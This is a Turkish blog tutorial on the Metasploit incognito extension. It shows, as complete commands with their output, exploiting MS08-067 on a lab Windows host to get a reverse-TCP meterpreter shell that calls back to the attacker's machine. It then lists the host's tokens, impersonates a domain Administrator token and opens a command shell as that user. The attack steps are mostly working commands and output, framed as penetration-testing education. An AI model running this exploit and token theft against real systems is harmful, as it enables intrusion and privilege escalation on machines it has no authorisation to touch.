---

authors:
  - name: İbrahim Korucuoğlu
    link: https://github.com/siberoloji
    image: https://github.com/siberoloji.png


categories:
- Metasploit Framework
classicmag_header_overlay:
- global-layout
classicmag_post_layout:
- layout-1
classicmag_post_sidebar_option:
- right-sidebar
date: "2017-06-05T13:24:00Z"
excerpt: Bir sisteme giriş yaptığınızda, sistemde bulunan kullanıcılara ait token adı
  verilen izin ve yetkilendirme kuralları bulunur. Bu kurallar, web uygulamalarında
  kullanılan cookie denilen çerez dosyalarına benzer. Kullanıcı ağdaki bir servise
  (örn. Net drive) ilk bağlandığında kullanıcı adı ve parolasıyla oturum açar. Oturum
  açıldığında sistem bu kullanıcıya bir token tanımlar. Artık bilgisayar kapanana
  kadar tekrar tekrar parola girmeden, sistemde bulunan servisi kullanma imkanı olacaktır.
guid: https://www.siberoloji.com/?p=1183
id: 1183
image: /assets/images/2024/06/metasploit.jpg
tags:
- cybersecurity
- metasploit framework
title: MSF Incognito
url: /tr/msf-incognito/
---

<!-- wp:heading {"level":1} -->
<h1 class="wp-block-heading" id="incognito-nedir">Incognito Nedir? 
<!-- /wp:heading -->

  Bir sisteme giriş yaptığınızda, sistemde bulunan kullanıcılara ait&nbsp;***token*** &nbsp;adı verilen izin ve yetkilendirme kuralları bulunur. Bu kurallar, web uygulamalarında kullanılan&nbsp;***cookie*** &nbsp;denilen çerez dosyalarına benzer. Kullanıcı ağdaki bir servise (örn. Net drive) ilk bağlandığında kullanıcı adı ve parolasıyla oturum açar. Oturum açıldığında sistem bu kullanıcıya bir&nbsp;***token*** &nbsp;tanımlar. Artık bilgisayar kapanana kadar tekrar tekrar parola girmeden, sistemde bulunan servisi kullanma imkanı olacaktır.
 

  Pentest işlemleri esnasında bu&nbsp;***token*** &nbsp;ve yetkilerini ele geçirerek kullanmaya&nbsp;***incognito*** &nbsp;işlemi denilmektedir.&nbsp;***token*** &nbsp;izinleri, ikiye ayrılmaktadır. Bunlara&nbsp;***delegate*** &nbsp;ve&nbsp;***impersonate*** &nbsp;adı verilmektedir. Okuyucunun kafasının karışmaması için biz de İngilizce şekillerini kullanmaya devam edeceğiz.
 

  Delegate: token izinleri beyan ediciler olarak kullanılır. Etkileşimli oturumlarda, örneğin uzak masaüstü bağlantıları tarzında işlemler için kullanılırlar.
 

  Impersonate: token izinleri kişisel olarak üretilmiş izinlerdir ve etkileşim olmayan servisler için kullanılırlar. Örneğin bir ağ klasörüne bağlanmak gibi.
 

<!-- wp:quote -->
<blockquote class="wp-block-quote">  Dosya sunucuları bu token izinleri için çok zengin bir bilgi kaynağıdırlar.
 </blockquote>
<!-- /wp:quote -->

  Hedef sistemde bir token ele geçirdiğinizde, artık bir servise bağlanmak için o kullanıcının parolasını bilmeye gerek kalmaz çünkü yetkilendirme önceden yapılmıştır ve yetki kontrolü&nbsp;***token*** &nbsp;iznine güvenilerek arka planda yapılır. Bir sistemde meterpreter shell açıldığında kullanılabilir durumda olan&nbsp;***token*** &nbsp;listesi kontrol edilmelidir.
 

 
<h2 class="wp-block-heading" id="meterpreter-oturum-açalım">Meterpreter Oturum Açalım
<!-- /wp:heading -->

  Aşağıdaki örnekte, öncelikle&nbsp;<code>ms08_067_netapi</code>&nbsp;modülü kullanılarak gerekli ayarlar yapılmakta ve bir oturum açılmaktadır.
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">msf ***&gt;***  use exploit/windows/smb/ms08_067_netapi
msf exploit***(*** ms08_067_netapi***)***  ***&gt;***  set RHOST 10.211.55.140
RHOST ***=&gt;***  10.211.55.140
msf exploit***(*** ms08_067_netapi***)***  ***&gt;***  set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD ***=&gt;***  windows/meterpreter/reverse_tcp
msf exploit***(*** ms08_067_netapi***)***  ***&gt;***  set LHOST 10.211.55.162
LHOST ***=&gt;***  10.211.55.162
msf exploit***(*** ms08_067_netapi***)***  ***&gt;***  set LANG english
LANG ***=&gt;***  english
msf exploit***(*** ms08_067_netapi***)***  ***&gt;***  show targets

Exploit targets:

   Id  Name                                               
   --  ----                                               
   0   Automatic Targeting                                
   1   Windows 2000 Universal                             
   2   Windows XP SP0/SP1 Universal                       
   3   Windows XP SP2 English ***(*** NX***)***                         
   4   Windows XP SP3 English ***(*** NX***)***                         
   5   Windows 2003 SP0 Universal                         
   6   Windows 2003 SP1 English ***(*** NO NX***)***                    
   7   Windows 2003 SP1 English ***(*** NX***)***                       
   8   Windows 2003 SP2 English ***(*** NO NX***)***                    
   9   Windows 2003 SP2 English ***(*** NX***)***                       
   10  Windows XP SP2 Arabic ***(*** NX***)***                          
   11  Windows XP SP2 Chinese - Traditional / Taiwan ***(*** NX***)***  


msf exploit***(*** ms08_067_netapi***)***  ***&gt;***  set TARGET 8
target ***=&gt;***  8
msf exploit***(*** ms08_067_netapi***)***  ***&gt;***  exploit

***[*** ******* ***]***  Handler binding to LHOST 0.0.0.0
***[*** ******* ***]***  Started reverse handler
***[*** ******* ***]***  Triggering the vulnerability...
***[*** ******* ***]***  Transmitting intermediate stager ***for *** over-sized stage...***(*** 191 bytes***)*** 
***[*** ******* ***]***  Sending stage ***(*** 2650 bytes***)*** 
***[*** ******* ***]***  Sleeping before handling stage...
***[*** ******* ***]***  Uploading DLL ***(*** 75787 bytes***)*** ...
***[*** ******* ***]***  Upload completed.
***[*** ******* ***]***  Meterpreter session 1 opened ***(*** 10.211.55.162:4444 -&gt; 10.211.55.140:1028***)*** 

meterpreter ***&gt;*** 
</code></pre>
<!-- /wp:code -->

 
<h2 class="wp-block-heading" id="incognito-modülünü-yükleyelim">Incognito Modülünü Yükleyelim
<!-- /wp:heading -->

  Meterpreter oturumu açmayı başardıktan sonra&nbsp;<code>incognito</code>&nbsp;modülünü kullanmamız gerekiyor.&nbsp;<code>Incognito</code>&nbsp;modülü, meterpreter e ait bir modül olduğundan&nbsp;<code>use incognito</code>&nbsp;komutuyla modülü aktif hale getiriyoruz. Ardından&nbsp;<code>help</code>&nbsp;komutunu verdiğinizde,&nbsp;<code>incognito</code>&nbsp;modülüne özel komutları görebiliriz.
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter ***&gt;***  use incognito
Loading extension incognito...success.
meterpreter ***&gt;***  help

Incognito Commands
***==================*** 

    Command              Description                                             
    -------              -----------                                             
    add_group_user       Attempt to add a user to a global group with all tokens 
    add_localgroup_user  Attempt to add a user to a local group with all tokens  
    add_user             Attempt to add a user with all tokens                   
    impersonate_token    Impersonate specified token                             
    list_tokens          List tokens available under current user context        
    snarf_hashes         Snarf challenge/response hashes ***for *** every token         

meterpreter ***&gt;*** 
</code></pre>
<!-- /wp:code -->

 
<h2 class="wp-block-heading" id="sistemdeki-token-listesi">Sistemdeki token Listesi
<!-- /wp:heading -->

  Meterpreter içerisinde&nbsp;<code>incognito</code>&nbsp;modülünü yükledikten sonra&nbsp;<code>list_tokens</code>&nbsp;komutuyla listeyi kontrol edelim. Listede bulunan bir takım&nbsp;***token*** &nbsp;izinlerine Administrator kullanıcılarının bile erişimi olmayabilir. Bizim en fazla ilgileneceğimiz tür&nbsp;***SYSTEM*** &nbsp;token izinleridir.
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter ***&gt;***  list_tokens -u

Delegation Tokens Available
***========================================*** 
NT AUTHORITY\LOCAL SERVICE
NT AUTHORITY\NETWORK SERVICE
NT AUTHORITY\SYSTEM
SNEAKS.IN\Administrator

Impersonation Tokens Available
***========================================*** 
NT AUTHORITY\ANONYMOUS LOGON

meterpreter ***&gt;*** 
</code></pre>
<!-- /wp:code -->

  Yukarıda listede bulunan&nbsp;<code>SNEAKS.IN\Administrator</code>&nbsp;isimli token fark ettiyseniz&nbsp;***Delegation*** &nbsp;listesinde bulunmaktadır. Bunu&nbsp;***Impersonation*** &nbsp;haline getirerek kişiselleştirmeniz gerekmektedir. Bunun için&nbsp;<code>impersonate_token</code>&nbsp;komutunu kullanacağız. Komutu girerken iki adet&nbsp;<code>\\</code>&nbsp;işareti kullanmaya dikkat edin. Listede&nbsp;<code>\</code>&nbsp;tek olsa da komutu girerken iki adet girilmelidir.
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter ***&gt;***  impersonate_token SNEAKS.IN\\Administrator
***[*** +] Delegation token available
***[*** +] Successfully impersonated user SNEAKS.IN\Administrator
meterpreter ***&gt;***  getuid
Server username: SNEAKS.IN\Administrator
meterpreter ***&gt;*** 
</code></pre>
<!-- /wp:code -->

  Komut başarıyla sonlandığında&nbsp;<code>getuid</code>&nbsp;komutuyla kullanıcı kimliğini kontrol ettiğimizde&nbsp;<code>Server username: SNEAKS.IN\Administrator</code>&nbsp;sonucu aldık.
 

 
<h2 class="wp-block-heading" id="yeni-kullacı-ile-shell-açma">Yeni Kullacı ile Shell Açma
<!-- /wp:heading -->

  Meterpreter içerisinde&nbsp;<code>execute -f cmd.exe -i -t</code>&nbsp;komutu ile komut satırında oturum açalım ve&nbsp;<code>whoami</code>&nbsp;komutuyla Windows kullanıcı kimliğine bakalım. Burada&nbsp;<code>-i</code>&nbsp;seçeneği&nbsp;***interact*** * yani etkileşimli,&nbsp;<code>-t</code>&nbsp;seçeneği ise yeni ele geçirdiğimiz&nbsp;<code>SNEAKS.IN\Administrator</code>&nbsp;token iznini kullanmayı ifade eder.
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter ***&gt;***  shell
Process 2804 created.
Channel 1 created.
Microsoft Windows XP ***[*** Version 5.1.2600]
***(*** C***)***  Copyright 1985-2001 Microsoft Corp.

C:\WINDOWS\system32&gt; whoami
whoami
SNEAKS.IN\administrator

C:\WINDOWS\system32&gt;
</code></pre>
<!-- /wp:code -->

  Kişisel bilgisayarlarda karşılaşabileceğiniz&nbsp;***token*** &nbsp;izinlerine, sunucu bilgisayarlarda daha çok rast gelebilirsiniz. Sunucularda bir çok servis etkileşimli ve çok kullanıcılı olarak çalıştığından liste daha uzun olacaktır. Bunların arasından en çok yetkili&nbsp;***token*** &nbsp;izinleri denemelisiniz.
 